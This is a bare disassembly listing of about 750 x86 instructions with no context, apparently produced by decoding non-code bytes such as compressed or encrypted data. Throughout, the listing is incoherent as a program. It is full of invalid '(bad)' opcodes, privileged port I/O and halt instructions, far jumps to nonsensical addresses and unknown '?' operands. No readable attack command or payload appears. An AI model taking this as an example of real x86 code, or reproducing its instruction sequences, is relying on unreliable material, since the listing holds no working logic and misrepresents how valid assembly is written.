  40502a:	cmp    ebx,DWORD PTR gs:[esp+eax*2]
  40502e:	je     0x404fde
  405030:	lock (bad) 
  405032:	xchg   ebx,eax
  405033:	pop    ebx
  405034:	jnp    0x405074
  405036:	dec    esp
  405037:	add    DWORD PTR gs:[ebp+0x5f],ecx
  40503b:	(bad)  
  40503c:	cmp    eax,0x5f27bc2
  405041:	fmul   QWORD PTR [eax+eiz*1-0x2c]
  405045:	std    
  405046:	cli    
  405047:	mov    ?,WORD PTR ds:0xda1a89fc
  40504d:	and    eax,0x2a67e224
  405052:	dec    edx
  405053:	ja     0x40506e
  405055:	push   cs
  405056:	es aas 
  405058:	arpl   WORD PTR [edx],bp
  40505a:	jmp    0x65322d3e
  40505f:	aaa    
  405060:	ret    
  405061:	push   ds
  405062:	jge    0x404fed
  405064:	in     al,0x2f
  405066:	test   DWORD PTR [eax+0x2554e899],ecx
  40506c:	fisttp WORD PTR [ebx-0x3d]
  40506f:	pop    esp
  405070:	lods   eax,DWORD PTR ds:[esi]
  405071:	(bad)  
  405072:	cmp    bl,bh
  405074:	jbe    0x405063
  405076:	stos   DWORD PTR es:[edi],eax
  405077:	inc    ebp
  405078:	in     al,0x94
  40507a:	xchg   ebp,eax
  40507b:	jns    0x40508a
  40507d:	sub    ch,dl
  40507f:	imul   edi,DWORD PTR [edx],0xc86da6a0
  405085:	mov    edi,0xde1f18a2
  40508a:	push   esi
  40508b:	xor    al,0x4a
  40508d:	mov    dl,ch
  40508f:	retf   0xec4a
  405092:	arpl   WORD PTR [ecx],ax
  405094:	daa    
  405095:	sub    esi,DWORD PTR [ebx+eax*2-0x4f]
  405099:	jo     0x4050ae
  40509b:	neg    BYTE PTR [ebp-0x76e414c1]
  4050a1:	outs   dx,DWORD PTR ds:[esi]
  4050a2:	mov    ds:0xc0b3fb1c,al
  4050a7:	jne    0x40506a
  4050a9:	cs pop ebx
  4050ab:	sbb    DWORD PTR [ebp-0x6],esp
  4050ae:	in     eax,0x56
  4050b0:	sub    DWORD PTR [esi-0x73fcddf3],0x90e1164c
  4050ba:	ret    
  4050bb:	adc    ebp,eax
  4050bd:	jmp    0xcf8b:0x8b4341d8
  4050c4:	cli    
  4050c5:	or     DWORD PTR [ebp+0x3435463e],ebp
  4050cb:	push   cs
  4050cc:	fsubr  st,st(5)
  4050ce:	mov    esi,edi
  4050d0:	jp     0x4050bf
  4050d2:	in     eax,0xa3
  4050d4:	inc    edx
  4050d5:	pop    ebp
  4050d6:	and    al,0xfb
  4050d8:	lds    edi,FWORD PTR ss:[esi]
  4050db:	leave  
  4050dc:	out    dx,al
  4050dd:	inc    edx
  4050de:	mov    ds,WORD PTR [ecx-0x47d1c144]
  4050e4:	popf   
  4050e5:	push   0xc681a2a
  4050ea:	jge    0x405092
  4050ec:	int3   
  4050ed:	add    BYTE PTR [eax+0x66110880],ah
  4050f3:	int3   
  4050f4:	lds    esp,FWORD PTR [eax+0x6a]
  4050f7:	push   ss
  4050f8:	arpl   WORD PTR [esi+0x61],ax
  4050fb:	xchg   edi,eax
  4050fc:	std    
  4050fd:	fnstcw WORD PTR [ecx]
  4050ff:	lea    eax,[eax]
  405101:	outs   dx,BYTE PTR ds:[esi]
  405102:	jo     0x405134
  405104:	leave  
  405105:	es pop esp
  405107:	imul   DWORD PTR [ebx+edx*1+0x4dc9550a]
  40510e:	pop    ss
  40510f:	iret   
  405110:	mov    ebp,0xc41436fe
  405115:	pop    ecx
  405116:	addr16 ss add al,0xe0
  40511a:	jp     0x405157
  40511c:	add    eax,0x7d382e21
  405121:	push   eax
  405122:	mov    ecx,0x28371aba
  405127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405128:	mov    ah,0x64
  40512a:	cmp    al,0xbf
  40512c:	mov    cl,0xd5
  40512e:	test   DWORD PTR es:[ebx],esi
  405131:	push   es
  405132:	cld    
  405133:	inc    esp
  405134:	push   esi
  405135:	ja     0x4050f3
  405137:	test   edx,ebx
  405139:	xchg   ebx,eax
  40513a:	sub    eax,0x218ad913
  40513f:	into   
  405140:	(bad)  
  405142:	add    eax,0xc7e0c1e4
  405147:	mov    ebx,0xe4d4c786
  40514c:	fs pop esi
  40514e:	mov    DWORD PTR [ebp+0x6af89f3d],edx
  405154:	rcl    ecx,cl
  405156:	adc    bh,0x6b
  405159:	mov    BYTE PTR [eax+0x5d49be1e],bh
  40515f:	add    edi,DWORD PTR [esi]
  405161:	and    ebx,ebp
  405163:	and    DWORD PTR [ecx+0x1684989f],0xc44f30a4
  40516d:	retf   0xf715
  405170:	or     al,0xf1
  405172:	fnstsw WORD PTR [edx-0x4c]
  405175:	mov    bh,dh
  405177:	into   
  405178:	add    edx,DWORD PTR [eax+0x36]
  40517b:	pop    ebp
  40517c:	mov    ebx,0xd5f4b447
  405181:	adc    DWORD PTR [edi],edx
  405183:	imul   edi,DWORD PTR [eax],0x20
  405186:	pop    eax
  405187:	jo     0x40514d
  405189:	arpl   WORD PTR [ebx+0xffa290c],sp
  40518f:	mov    bl,0xda
  405191:	adc    BYTE PTR [edi-0x44],al
  405194:	lea    ebp,[eax+0x7cbcef12]
  40519a:	and    BYTE PTR [esi-0x4b],al
  40519d:	xor    al,0x75
  40519f:	mov    esp,DWORD PTR [esi-0x5]
  4051a2:	daa    
  4051a3:	(bad)  
  4051a5:	out    0x8d,al
  4051a7:	and    eax,0xe3c9b934
  4051ac:	ret    
  4051ad:	push   0x6d5d67e4
  4051b2:	(bad)
  4051b6:	adc    ecx,DWORD PTR [edi]
  4051b8:	dec    ebp
  4051b9:	push   0x49
  4051bb:	add    al,0x1c
  4051bd:	loop   0x4051a7
  4051bf:	pop    ebp
  4051c0:	mov    esi,0x1800ae92
  4051c5:	adc    DWORD PTR [esi-0x2b],ebp
  4051c8:	xlat   BYTE PTR ds:[ebx]
  4051c9:	push   ds
  4051ca:	adc    eax,0xf073e137
  4051cf:	pop    ecx
  4051d0:	sbb    BYTE PTR [esi],dh
  4051d2:	xchg   ebp,eax
  4051d3:	nop
  4051d4:	cld    
  4051d5:	and    al,0x71
  4051d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051d8:	in     al,0x5f
  4051da:	pop    esp
  4051db:	leave  
  4051dc:	mov    WORD PTR [esi],?
  4051de:	mov    ds:0x4b1cf7e0,eax
  4051e3:	and    BYTE PTR [ebp+0x6a798202],bh
  4051e9:	jns    0x405194
  4051eb:	xchg   BYTE PTR [ebx+0x10f33d80],dl
  4051f1:	push   ebp
  4051f2:	or     eax,0x817e351c
  4051f7:	jp     0x405230
  4051f9:	outs   dx,BYTE PTR ds:[esi]
  4051fa:	or     eax,0x5c848dbe
  4051ff:	clc    
  405200:	sub    cl,BYTE PTR [ebx-0x17]
  405203:	inc    BYTE PTR [edx]
  405205:	ins    DWORD PTR es:[edi],dx
  405206:	push   eax
  405207:	sahf   
  405208:	sbb    DWORD PTR [edx-0x24],ebp
  40520b:	dec    esp
  40520c:	dec    DWORD PTR [ecx-0x2f71514e]
  405212:	(bad)  
  405213:	fsubr  QWORD PTR [ecx-0x5b]
  405216:	xor    DWORD PTR [ebp-0x6c],ecx
  405219:	pop    es
  40521a:	mov    dh,0x4a
  40521c:	sqrtps xmm6,XMMWORD PTR [ebx+0xf]
  405220:	out    dx,al
  405221:	push   ebp
  405222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405223:	rcr    BYTE PTR ds:0xb77eeb66,cl
  405229:	push   eax
  40522a:	xchg   edx,eax
  40522b:	call   0xacfc:0x723e4f28
  405232:	xor    bh,BYTE PTR [ebx-0x7b5506f4]
  405238:	cmp    BYTE PTR [edi+ebx*8],0xc5
  40523c:	mov    cl,0x0
  40523e:	dec    eax
  40523f:	dec    ecx
  405240:	or     eax,0x14c67821
  405245:	in     eax,dx
  405246:	les    esi,FWORD PTR [edx]
  405248:	sub    al,0x5f
  40524a:	dec    ecx
  40524b:	scas   al,BYTE PTR es:[edi]
  40524c:	push   esi
  40524d:	aas    
  40524e:	out    0x90,al
  405250:	outs   dx,BYTE PTR ds:[esi]
  405251:	mov    ds,WORD PTR [eax+eiz*8-0x44]
  405255:	xlat   BYTE PTR ds:[ebx]
  405256:	out    dx,eax
  405257:	(bad)  
  405258:	outs   dx,DWORD PTR ds:[esi]
  405259:	stos   DWORD PTR es:[edi],eax
  40525a:	gs retf 0xcd00
  40525e:	pop    esi
  40525f:	loopne 0x405260
  405261:	push   esp
  405262:	loop   0x405229
  405264:	mov    eax,0xd48480ca
  405269:	out    dx,al
  40526a:	jl     0x4051ef
  40526c:	nop
  40526d:	repnz push ss
  40526f:	shr    ebp,0x61
  405272:	add    eax,DWORD PTR [ebp-0x64]
  405275:	push   edi
  405276:	and    BYTE PTR gs:[edi+0x2ceca0db],ah
  40527d:	call   0x3f17:0x6d61d3b4
  405284:	push   esp
  405285:	outs   dx,BYTE PTR ds:[esi]
  405286:	add    al,0x9
  405288:	ret    0x4d49
  40528b:	dec    esi
  40528c:	dec    esp
  40528d:	or     esp,DWORD PTR [eax]
  40528f:	sbb    al,0x34
  405291:	adc    al,0x1a
  405293:	fisttp WORD PTR [ecx+0x6a]
  405296:	pop    edx
  405297:	sub    eax,0xe626c3d1
  40529c:	dec    ecx
  40529d:	and    eax,0xecbe4a7c
  4052a2:	jecxz  0x405263
  4052a4:	pop    eax
  4052a5:	push   0xffffffd3
  4052a7:	imul   eax,DWORD PTR [esp+eiz*8+0x1650002a],0x69
  4052af:	cmp    ecx,DWORD PTR [esi-0x594f12b6]
  4052b5:	jecxz  0x4052ef
  4052b7:	dec    edx
  4052b8:	add    DWORD PTR [edx+0x3f],edx
  4052bb:	ins    DWORD PTR es:[edi],dx
  4052bc:	cld    
  4052bd:	mov    cl,0xb5
  4052bf:	xchg   BYTE PTR [edi-0x141131c1],bh
  4052c5:	sti    
  4052c6:	mov    ebp,0xb2b8de73
  4052cb:	imul   esi,DWORD PTR [esi-0x42b2d136],0xb0b8f5fa
  4052d5:	mov    ebx,0x5bfa1eae
  4052da:	or     eax,0x2a990472
  4052df:	or     cl,BYTE PTR [edi]
  4052e1:	inc    eax
  4052e2:	sub    cl,BYTE PTR ds:0x1aa576a1
  4052e8:	mov    esi,0x2aa20c92
  4052ed:	aaa    
  4052ee:	(bad)  
  4052f0:	push   esp
  4052f1:	cmp    ah,0x4e
  4052f4:	sbb    eax,0x9d2273d9
  4052f9:	daa    
  4052fa:	fidiv  DWORD PTR [ebx-0x4e]
  4052fd:	fcom   DWORD PTR [ebp-0x5e]
  405300:	and    al,0xe8
  405302:	mov    ch,0xce
  405304:	cdq    
  405305:	cld    
  405306:	imul   ebp,DWORD PTR [ecx+0x33],0xffffffed
  40530a:	xchg   edi,eax
  40530b:	sbb    al,BYTE PTR [eax+0x7bbee101]
  405311:	mov    esi,0xef11c4a0
  405316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405317:	mov    DWORD PTR [ecx+0x3e],0xc81e4efc
  40531e:	sub    BYTE PTR [edi-0x53],dl
  405321:	fwait
  405322:	or     BYTE PTR [ecx+0x74],al
  405325:	(bad)  
  405326:	push   esp
  405327:	push   ebx
  405328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405329:	fwait
  40532a:	pop    es
  40532b:	daa    
  40532c:	je     0x405300
  40532e:	test   al,0x8
  405330:	mov    ecx,0x359114b0
  405335:	inc    eax
  405336:	cmp    eax,0xbbe5bccd
  40533b:	or     ecx,DWORD PTR [ebx-0x1c]
  40533e:	imul   ecx,DWORD PTR [edx],0x1f08d29e
  405344:	lahf   
  405345:	fs xor cl,dh
  405348:	push   cs
  405349:	pop    esp
  40534a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40534b:	mov    ah,BYTE PTR [eax+0x5d]
  40534e:	cmp    DWORD PTR [edi],edi
  405350:	add    cl,ch
  405352:	or     eax,0x612b259d
  405357:	ins    BYTE PTR es:[edi],dx
  405358:	fs mov bh,0x71
  40535b:	adc    BYTE PTR [ebx+0x3b],al
  40535e:	add    al,0x9f
  405360:	pop    eax
  405361:	enter  0x82b,0x2
  405365:	retf   0x3888
  405368:	mov    al,cl
  40536a:	add    edx,DWORD PTR es:[ebp-0x370cf398]
  405371:	fdivr  DWORD PTR [edx+0x60]
  405374:	shl    BYTE PTR [ecx],0xa5
  405377:	hlt    
  405378:	dec    ebx
  405379:	daa    
  40537a:	repz sub BYTE PTR [ebx],dh
  40537d:	(bad)  
  40537e:	sbb    ah,ch
  405380:	inc    esi
  405381:	aad    0x3
  405383:	adc    edx,DWORD PTR [ebp-0x6c42719]
  405389:	fcom   DWORD PTR [ecx+esi*2-0x2f623d5f]
  405390:	jge    0x40536c
  405392:	(bad)  
  405393:	js     0x405356
  405395:	adc    edi,DWORD PTR [esi]
  405397:	adc    al,0x5a
  405399:	addr16 inc ecx
  40539b:	test   al,0x9d
  40539d:	jno    0x405338
  40539f:	ins    BYTE PTR es:[edi],dx
  4053a0:	sbb    esi,DWORD PTR [edi-0x24]
  4053a3:	push   esi
  4053a4:	push   esi
  4053a5:	fisttp DWORD PTR [esi]
  4053a7:	shr    BYTE PTR [ebx-0x4d],cl
  4053aa:	imul   ecx,DWORD PTR [ecx],0x8
  4053ad:	mov    esi,0x6b57efc9
  4053b2:	hlt    
  4053b3:	lods   al,BYTE PTR ds:[esi]
  4053b4:	mov    BYTE PTR [ebp-0x1b80f894],al
  4053ba:	dec    edx
  4053bb:	adc    eax,esi
  4053bd:	outs   dx,BYTE PTR ds:[esi]
  4053be:	ret    0x378c
  4053c1:	mov    es,ecx
  4053c3:	xchg   DWORD PTR ss:[eax+0x76],edi
  4053c7:	cmp    BYTE PTR [ebp-0x8b32397],0xaf
  4053ce:	xchg   esp,eax
  4053cf:	pop    edi
  4053d0:	xor    dh,al
  4053d2:	xchg   ebp,eax
  4053d3:	inc    edi
  4053d4:	into   
  4053d5:	cwde   
  4053d6:	pop    esp
  4053d7:	mov    bl,0xfc
  4053d9:	mov    WORD PTR [eax+0x752ba0be],ds
  4053df:	lds    ebx,FWORD PTR [esi]
  4053e1:	in     al,dx
  4053e2:	out    dx,eax
  4053e3:	mov    ch,0x56
  4053e5:	add    eax,0x505c10a5
  4053ea:	bound  eax,QWORD PTR [ecx+0x56]
  4053ed:	push   ebp
  4053ee:	aad    0x1f
  4053f0:	fwait
  4053f1:	sub    ebp,esp
  4053f3:	sub    DWORD PTR [esi+0x26b87db5],edi
  4053f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053fa:	repz ja 0x405413
  4053fd:	dec    edi
  4053fe:	cmp    ecx,DWORD PTR [ebp-0x6a]
  405401:	(bad)  
  405402:	and    al,0x76
  405404:	scas   al,BYTE PTR es:[edi]
  405405:	jnp    0x405443
  405407:	cli    
  405408:	inc    edi
  405409:	or     eax,0xf58f0513
  40540e:	cmp    ecx,esp
  405410:	pushf  
  405411:	dec    esi
  405412:	outs   dx,DWORD PTR ds:[esi]
  405413:	add    DWORD PTR [edi],0x7218f06
  405419:	mov    edi,0xb73b78af
  40541e:	scas   eax,DWORD PTR es:[edi]
  40541f:	cdq    
  405420:	or     al,0xc8
  405422:	enter  0xbb63,0x36
  405426:	inc    edi
  405427:	in     al,dx
  405428:	adc    ah,BYTE PTR [edi-0x5f83219c]
  40542e:	and    eax,0xd1ccd664
  405433:	mov    dl,0xa2
  405435:	arpl   WORD PTR [ecx+ecx*4],ax
  405438:	test   BYTE PTR [ebx+eax*4-0x76116686],bh
  40543f:	retf   0x38ce
  405442:	shld   DWORD PTR [edi+0x2ae946ea],ebx,0x5c
  40544a:	dec    edx
  40544b:	jge    0x405487
  40544d:	les    ebp,FWORD PTR [edx]
  40544f:	(bad)  
  405450:	xchg   ebp,eax
  405451:	(bad)  
  405452:	adc    DWORD PTR [edi],ebx
  405454:	xchg   ebx,eax
  405455:	stc    
  405456:	pop    ebx
  405457:	and    eax,0x2012d98b
  40545c:	jle    0x405421
  40545e:	std    
  40545f:	xor    al,0xec
  405461:	popf   
  405462:	daa    
  405463:	mov    WORD PTR [eax],?
  405465:	inc    esi
  405466:	xor    DWORD PTR [ecx-0x30],esi
  405469:	sub    eax,0x50
  40546c:	std    
  40546d:	add    al,0xb1
  40546f:	retf   0x1999
  405472:	imul   eax,DWORD PTR ds:0x5ad60a46,0xbd0a742a
  40547c:	das    
  40547d:	sbb    eax,0x80344058
  405482:	mov    al,ds:0xf244e8e8
  405487:	xchg   ebp,eax
  405488:	sbb    eax,0xcde5a19e
  40548d:	ret    0xc3f7
  405490:	cwde   
  405491:	addr16 jbe 0x40549a
  405494:	ins    DWORD PTR es:[edi],dx
  405495:	invd   
  405497:	push   esp
  405498:	and    edx,DWORD PTR [edx+0x7c]
  40549b:	enter  0x5b62,0x64
  40549f:	inc    edi
  4054a0:	mov    dl,0x2
  4054a2:	mov    ecx,0x9cfdae2f
  4054a7:	test   DWORD PTR [edx-0x4c],edi
  4054aa:	pop    ss
  4054ab:	test   eax,0x918f881c
  4054b0:	test   DWORD PTR [edi+ebx*2],ebp
  4054b3:	push   ds
  4054b4:	aad    0x3f
  4054b6:	out    dx,al
  4054b7:	rcr    BYTE PTR [esi-0x5c2e6740],1
  4054bd:	test   eax,0x1f4c580b
  4054c2:	mov    gs,ecx
  4054c4:	and    edx,DWORD PTR ds:0xb339476e
  4054ca:	cdq    
  4054cb:	fcomp  DWORD PTR [ebp-0x1dc35d]
  4054d1:	or     BYTE PTR [ebx+0x22],bl
  4054d4:	and    BYTE PTR [ebx],bl
  4054d6:	rol    DWORD PTR [esi],0x31
  4054d9:	mov    bl,0xe5
  4054db:	mov    ah,0x9a
  4054dd:	cmp    dh,BYTE PTR ds:0xe20cee96
  4054e3:	xchg   esp,eax
  4054e4:	test   al,0x7
  4054e6:	idiv   BYTE PTR [esi]
  4054e8:	mov    esp,0xc9255ebd
  4054ed:	pop    ecx
  4054ee:	pop    esi
  4054ef:	lods   al,BYTE PTR ds:[esi]
  4054f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054f1:	push   0x224209f2
  4054f6:	mov    ah,0x15
  4054f8:	(bad)  
  4054f9:	or     BYTE PTR [esi+0x27],dh
  4054fc:	lds    edi,FWORD PTR [bx+di-0x3f]
  405500:	sbb    DWORD PTR [esi-0x2487a29b],0xb5f610cc
  40550a:	inc    ebp
  40550b:	sbb    al,0xb0
  40550d:	add    ch,BYTE PTR [esi]
  40550f:	popf   
  405510:	mov    WORD PTR [ebp+0x1b],gs
  405513:	ins    DWORD PTR es:[edi],dx
  405514:	ds mov edx,0x6e14088f
  40551a:	jb     0x4054ee
  40551c:	dec    esi
  40551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551e:	inc    eax
  40551f:	(bad)  
  405520:	fist   WORD PTR [eax]
  405522:	inc    ecx
  405523:	stos   BYTE PTR es:[edi],al
  405524:	(bad)  
  405525:	sub    al,0x99
  405527:	xlat   BYTE PTR ds:[ebx]
  405528:	dec    ecx
  405529:	push   edi
  40552a:	mov    dl,dh
  40552c:	outs   dx,DWORD PTR ds:[esi]
  40552d:	mov    ds:0x783e93ed,al
  405532:	pop    ds
  405533:	(bad)  
  405534:	not    ah
  405536:	fld    TBYTE PTR [ecx]
  405538:	adc    cl,BYTE PTR [edi+edi*8]
  40553b:	stos   DWORD PTR es:[edi],eax
  40553c:	lea    ecx,[edi+0x3dd7ed10]
  405542:	test   al,0xe0
  405544:	mov    ds:0x403f3aae,eax
  405549:	fld    TBYTE PTR [ebp+0x118f43d7]
  40554f:	imul   eax,DWORD PTR [edi],0xffffffaa
  405552:	xrelease xchg DWORD PTR [esp+edx*8-0x4219280e],eax
  40555a:	mov    edi,0x19c1a086
  40555f:	jne    0x405594
  405561:	dec    ebx
  405562:	and    al,0xac
  405565:	retw   
  405567:	and    dl,BYTE PTR [edx]
  405569:	pushf  
  40556a:	add    DWORD PTR [ecx],0x76cb6f86
  405570:	push   edx
  405571:	into   
  405572:	sbb    bl,cl
  405574:	add    ebx,DWORD PTR [edi+0x4c1bf985]
  40557a:	sbb    DWORD PTR ss:[ebp-0x77],esp
  40557e:	xchg   edx,eax
  40557f:	addr16 je 0x4055e3
  405582:	adc    DWORD PTR [edx+0xc],eax
  405585:	and    BYTE PTR ds:0x95377bf5,bh
  40558b:	lds    edi,FWORD PTR [ecx]
  40558d:	sbb    esi,DWORD PTR [ebp+0x8]
  405590:	fisttp WORD PTR [edx-0x13]
  405593:	and    eax,0x5e42a15a
  405598:	inc    ebx
  405599:	into   
  40559a:	aas    
  40559b:	(bad)  
  40559c:	shl    dh,1
  40559e:	inc    esp
  40559f:	adc    cl,BYTE PTR [eax]
  4055a1:	push   ebx
  4055a2:	in     al,dx
  4055a3:	in     eax,0x29
  4055a5:	fwait
  4055a6:	pop    eax
  4055a7:	cmp    edi,DWORD PTR [esi+0x7f]
  4055aa:	into   
  4055ab:	push   ds
  4055ac:	jmp    0x40555e
  4055ae:	mov    edx,0x65a8ff9a
  4055b3:	(bad)  
  4055b5:	aam    0xaf
  4055b7:	mov    edx,0x462c18a2
  4055bc:	sub    al,0x75
  4055be:	cmp    DWORD PTR [ebx+0x7d2e8d0e],edx
  4055c4:	sbb    DWORD PTR [ecx],esi
  4055c6:	xor    esi,DWORD PTR [edx+ebp*2]
  4055c9:	in     al,0x16
  4055cb:	cmp    bl,al
  4055cd:	addr16 sbb eax,0xa7f5e838
  4055d3:	cmp    eax,0xb4e7d892
  4055d8:	data16 aas 
  4055da:	xor    ah,BYTE PTR [ebp-0x60f4b6b2]
  4055e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055e1:	adc    ch,BYTE PTR [eax]
  4055e3:	jp     0x405603
  4055e5:	xor    al,0xff
  4055e7:	jg     0x40565d
  4055e9:	xchg   edi,eax
  4055ea:	sbb    eax,0x2497afc4
  4055ef:	xchg   BYTE PTR [ecx-0x65bdc508],cl
  4055f5:	hlt    
  4055f6:	clc    
  4055f7:	adc    esp,esp
  4055f9:	push   esp
  4055fa:	and    eax,0xd25ab318
  4055ff:	arpl   bx,dx
  405601:	mov    bl,0x7
  405603:	jmp    0xa83e5f8a
  405608:	mov    al,ds:0xbd0b6746
  40560d:	rcl    BYTE PTR cs:[ebx+esi*8+0x2c1dc841],0xeb
  405616:	mov    dh,0xa9
  405618:	sar    BYTE PTR [esi-0x45],1
  40561b:	xor    ch,0xbb
  40561e:	xchg   ebp,eax
  40561f:	lahf   
  405620:	mov    eax,ds:0x1e98f0c7
  405625:	dec    BYTE PTR [esi+0x639e49c6]
  40562b:	fstp   TBYTE PTR [edi+0x15]
  40562e:	psrlw  mm2,QWORD PTR [esi-0x721e8257]
  405635:	push   esp
  405636:	jge    0x40567e
  405638:	mov    WORD PTR [eax-0x15],cs
  40563b:	loop   0x40565d
  40563d:	pop    esi
  40563e:	push   esp
  40563f:	mov    edi,0xbb2f5c1b
  405644:	pop    ebx
  405645:	jmp    0x5c89:0xb0b13d5d
  40564c:	cmc    
  40564d:	rcl    eax,1
  40564f:	jle    0x4056ba
  405651:	in     al,dx
  405652:	cmp    bl,BYTE PTR [esi+0x10]
  405655:	mov    ds:0x6ae35aec,eax
  40565a:	neg    BYTE PTR [ecx+0x6f226bce]
  405660:	add    BYTE PTR [esi],0xe1
  405663:	pusha  
  405664:	and    edi,edi
  405666:	inc    ebx
  405667:	mov    DWORD PTR [eax-0x3d95c199],esp
  40566d:	mov    edi,0x389dee82
  405672:	cmc    
  405673:	cwde   
  405674:	inc    edi
  405675:	mov    WORD PTR [edx],fs
  405677:	aam    0xcd
  405679:	mov    ebp,0xb8812be6
  40567e:	mov    esp,0x5bc27cee
  405683:	push   0x60bc2203
  405688:	push   0x4
  40568a:	shl    esi,1
  40568c:	scas   eax,DWORD PTR es:[edi]
  40568d:	dec    edx
  40568e:	stc    
  40568f:	(bad)  
  405691:	orps   xmm4,XMMWORD PTR [eax-0x77]
  405695:	mov    ah,0xaf
  405697:	pop    es
  405698:	scas   al,BYTE PTR es:[edi]
  405699:	hlt    
  40569a:	inc    edi
  40569b:	sbb    DWORD PTR [edi+0x21d0b0ec],ebx
  4056a1:	xchg   ebp,eax
  4056a2:	jns    0x40570c
  4056a4:	jb     0x40563a
  4056a6:	and    BYTE PTR [esi+0x3c],cl
  4056a9:	imul   edx,DWORD PTR [ebx-0x3b8bbde6],0xffffffe7
  4056b0:	jb     0x4056f8
  4056b2:	pop    ebx
  4056b3:	xor    edi,ebx
  4056b5:	adc    BYTE PTR [ebx-0x67ead576],dh
  4056bb:	sbb    DWORD PTR [edx+0x5f8a4a53],edx
  4056c1:	push   ebp
  4056c2:	sub    eax,edx
  4056c4:	xor    DWORD PTR [edx],eax
  4056c6:	je     0x405689
  4056c8:	enter  0xd627,0x3c
  4056cc:	jmp    0x4056be
  4056ce:	in     al,0xab
  4056d0:	mov    al,ds:0x8b0fdb33
  4056d5:	nop
  4056d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056d7:	xor    ah,BYTE PTR [eax+0x40872847]
  4056dd:	push   0x6a
  4056df:	pop    esi
  4056e0:	jne    0x40574e
  4056e2:	neg    DWORD PTR [esi]
  4056e4:	inc    edi
  4056e5:	inc    esp
  4056e6:	add    dl,BYTE PTR [ebp-0x1ed0a024]
  4056ec:	mov    ecx,edx
  4056ee:	xchg   bp,ax
  4056f0:	verw   bx
  4056f3:	mov    ?,WORD PTR [ebx]
  4056f5:	jnp    0x405691
  4056f7:	ss cmp eax,0x519265db
  4056fd:	(bad)  
  4056fe:	aam    0x41
  405700:	popf   
  405701:	jno    0x40574a
  405703:	call   0xb0ca:0xea6bb2b6
  40570a:	dec    eax
  40570b:	pop    esp
  40570c:	addr16 mov cl,0x53
  40570f:	sbb    DWORD PTR [ebx],edx
  405711:	add    eax,0xcff88b29
  405716:	mov    eax,ds:0x60fd7583
  40571b:	test   BYTE PTR [esi],ah
  40571d:	mov    ds:0x3a6035af,eax
  405722:	mov    cl,0xc
  405724:	lods   al,BYTE PTR ds:[esi]
  405725:	inc    esp
  405726:	sar    BYTE PTR [ecx-0x4a],1
  405729:	das    
  40572a:	out    dx,al
  40572b:	jp     0x405783
  40572d:	mov    edx,0x5781faea
  405732:	call   0xcf6fc280
  405737:	xchg   edi,eax
  405738:	mov    BYTE PTR [eax+0xe],bl
  40573b:	fsub   QWORD PTR gs:[edx]
  40573e:	xchg   esi,eax
  40573f:	pop    edx
  405740:	push   edi
  405741:	(bad)  [eax+0x62]
  405744:	in     eax,0x51
  405746:	cs retf 0x8d7e
  40574a:	inc    ecx
  40574b:	push   0x28
  40574d:	ret    
  40574e:	lahf   
  40574f:	cwde   
  405750:	rcr    WORD PTR [edi+ebx*4-0x797146e0],cl
  405758:	(bad)  
  405759:	and    al,0xea
  40575b:	ss push eax
  40575d:	sti    
  40575e:	mov    ah,0xbc
  405760:	rcr    BYTE PTR [edi+0x6e],cl
  405763:	in     al,dx
  405764:	and    eax,0x2789e5eb
  405769:	mov    esi,0xb1b06606
  40576e:	push   ss
  40576f:	div    edi
  405771:	daa    
  405772:	push   ecx
  405773:	sub    eax,DWORD PTR [edi+0x79]
  405776:	push   es
  405777:	jg     0x405720
  405779:	mov    ecx,0x99dee54
  40577e:	xor    DWORD PTR [eax+edi*1-0x5892dc37],edi
  405785:	jmp    0x8e02e938
  40578a:	stc    
  40578b:	pop    eax
  40578c:	adc    edi,eax
  40578e:	outs   dx,BYTE PTR ds:[esi]
  40578f:	sbb    al,BYTE PTR [edx+0x53d4285d]
  405795:	fild   DWORD PTR [esi+0x343be7fe]
  40579b:	add    BYTE PTR [ecx],0x1e
  40579e:	fisubr DWORD PTR [edi]
  4057a0:	retf   0x81e
  4057a3:	mov    ds:0x843a5a78,al
  4057a8:	dec    ebp
  4057a9:	xchg   ebx,eax
  4057aa:	fwait
  4057ab:	mov    ecx,0xc90a8f3
  4057b0:	fwait
  4057b1:	inc    ebp
  4057b2:	cmp    eax,0x93b6dfdc
  4057b7:	out    0xa0,al
  4057b9:	popa   
  4057ba:	hlt    
  4057bb:	inc    edx
  4057bc:	scas   eax,DWORD PTR es:[edi]
  4057bd:	adc    ebp,ebx
  4057bf:	int    0xa1
  4057c1:	stc    
  4057c2:	dec    edi
  4057c3:	test   al,0x92
  4057c5:	mov    ds:0x33e5f64,al
  4057ca:	mov    ch,0x5f
  4057cc:	jmp    0x405759
  4057ce:	in     eax,dx
  4057cf:	mov    ss,ecx
  4057d1:	outs   dx,BYTE PTR ds:[esi]
  4057d2:	inc    ebx
  4057d3:	and    esp,DWORD PTR [ebx]
  4057d5:	retf   0xf241
  4057d8:	retf   
  4057d9:	loop   0x40579d
  4057db:	sub    DWORD PTR [eax],esp
  4057dd:	std    
  4057de:	pop    eax
  4057df:	mov    edx,0x4dbc8c60
  4057e4:	cmc    
  4057e5:	ss push ebp
  4057e7:	loop   0x405841
  4057e9:	jle    0x4057c2
  4057eb:	lods   al,BYTE PTR ds:[esi]
  4057ec:	aas    
  4057ed:	xor    eax,0x66f4e06a
  4057f2:	popa   
  4057f3:	inc    ecx
  4057f4:	(bad)  
  4057f5:	jp     0x405782
  4057f7:	call   0xd810b0e1
  4057fc:	loop   0x4057ff
  4057fe:	lods   al,BYTE PTR ds:[esi]
  4057ff:	scas   al,BYTE PTR es:[edi]
  405800:	or     eax,0xb0341972
  405805:	dec    ebx
  405806:	push   ecx
  405807:	mov    esp,0x32a99464
  40580c:	bound  edx,QWORD PTR [ebx]
  40580e:	sub    ch,BYTE PTR ss:[edi+0x24f10811]
  405815:	std    
  405816:	jbe    0x4057e5
  405818:	inc    ecx
  405819:	sbb    eax,0x8f090a60
  40581e:	je     0x4057c9
